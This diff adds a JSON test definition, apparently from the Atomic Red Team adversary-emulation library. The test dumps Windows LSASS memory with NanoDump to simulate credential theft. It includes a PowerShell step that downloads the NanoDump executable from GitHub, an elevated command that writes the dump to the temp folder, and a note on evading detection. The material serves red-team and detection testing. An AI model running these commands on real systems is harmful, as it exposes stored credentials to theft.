@@ -1,0 +1,32 @@
+{
+    "name": "Dump LSASS.exe Memory using NanoDump",
+    "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.  https://github.com/helpsystems/nanodump  Upon successful execution, you should find the nanondump.dmp file in the temp directory ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
+        "cleanup_command": "del \"%temp%\\nanodump.dmp\" >nul 2> nul\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "LSASS Memory",
+    "source": "ART",
+    "uuid": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+            "prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
